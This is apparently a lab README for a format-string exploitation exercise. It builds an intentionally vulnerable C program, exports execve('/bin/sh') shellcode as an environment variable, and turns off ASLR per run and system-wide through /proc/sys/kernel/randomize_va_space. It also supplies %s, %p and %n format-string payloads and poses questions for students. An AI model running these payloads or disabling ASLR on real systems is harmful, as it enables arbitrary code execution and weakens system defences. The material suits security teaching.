# insecure-format-strings

## Build
```
clang getenvaddr.c -o getenvaddr
clang exploitable.c -Wno-format-security -o exploitable
```

## Add shellcode to environment
```
export SHELLCODE=$(printf "\xeb\x17\x5f\x48\x31\xd2\x48\x31\xc0\x48\x89\xe6\x48\x89\x54\x24\x08\x48\x89\x3c\x24\xb0\x3b\x0f\x05\xe8\xe4\xff\xff\xff/bin/sh")
```

## Using command specific disabling of ASLR
### 1. Turn off ASLR for a specific run
```
setarch `uname -m` -R <command>
```

### 2. Find address
```
setarch `uname -m` -R ./getenvaddr SHELLCODE ./exploitable
setarch `uname -m` -R ./getenvaddr PATH ./exploitable
```

### 3. Print environment variable (find address with the command above)
```
setarch `uname -m` -R ./exploitable ..%13\$s.$(printf "\x21\xe9\xff\xff\xff\x7f")
```

### 4. Try to explaing what is happening here?
```
setarch `uname -m` -R ./exploitable AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%nAAAA$(printf "\x40\x10\x60")
```

## Using global disabling of ASLR
### 1. Turn off ASLR until next boot
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### 2. Find address
```
./getenvaddr SHELLCODE ./exploitable
./getenvaddr PATH ./exploitable
```

### 3. Print environment variable (find address with the command above)
```
./exploitable ..%13\$s.$(printf "\x21\xe9\xff\xff\xff\x7f")
```

**So this time the printf string is a bit off, maybe you can fix it?**

### 4. What is happening here?
```
./exploitable AAAAAAAA..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%p..%nAAAA$(printf "\x40\x10\x60")
```
